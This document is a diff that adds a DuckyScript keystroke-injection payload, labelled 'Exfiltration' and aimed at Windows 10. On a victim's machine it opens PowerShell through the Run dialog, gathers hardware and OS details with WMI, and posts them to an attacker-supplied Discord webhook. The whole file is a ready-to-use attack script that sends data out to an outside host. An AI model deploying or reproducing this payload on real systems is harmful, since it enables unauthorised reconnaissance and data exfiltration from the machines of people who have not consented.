@@ -1,0 +1,73 @@
+REM Author: Woozy
+REM Description: This script will get PC information using WMI and send it to a Discord webhook.
+REM Version:	1.0
+REM Category:	Exfiltration
+REM Target:	Windows 10
+
+REM Open PowerShell
+WINDOWS r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+
+REM Get PC information using WMI
+STRING $manufacturer = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer
+ENTER
+DELAY 200
+STRING $model = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model
+ENTER
+DELAY 200
+STRING $totalPhysicalMemory = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory | ForEach-Object { [math]::Round($_ / 1GB) }
+ENTER
+DELAY 200
+STRING $cpuInfo = (Get-WmiObject -Class Win32_Processor | Select-Object Name).Name
+ENTER
+DELAY 200
+STRING $osInfoCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+ENTER
+DELAY 200
+STRING $osInfoVersion = (Get-WmiObject -Class Win32_OperatingSystem).Version
+ENTER
+DELAY 200
+
+REM Get current date and time
+STRING $date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
+ENTER
+DELAY 200
+
+REM Create content string with PC information
+STRINGLN $content = @"
+STRINGLN **Date:** $date
+STRINGLN **Manufacturer** = $manufacturer
+STRINGLN **Model** = $model
+STRINGLN **TotalPhysicalMemory** = $totalPhysicalMemory GB
+STRINGLN **CPU** = $cpuInfo
+STRINGLN **OS** = $osInfoCaption
+STRINGLN **OSVersion** = $osInfoVersion
+STRINGLN "@
+DELAY 200
+
+REM Convert content to JSON payload
+STRING $payload = @{ content = $content } | ConvertTo-Json
+ENTER
+DELAY 200
+
+REM Set Discord webhook URL
+STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK"
+ENTER
+DELAY 200
+
+REM Set headers for the HTTP request
+STRING $headers = @{ "Content-Type" = "application/json" }
+ENTER
+DELAY 200
+
+REM Send HTTP POST request to Discord webhook
+STRING Invoke-RestMethod -Uri $webhookUrl -Method POST -Headers $headers -Body $payload
+ENTER
+DELAY 200
+
+REM Exit PowerShell
+STRING exit
+ENTER
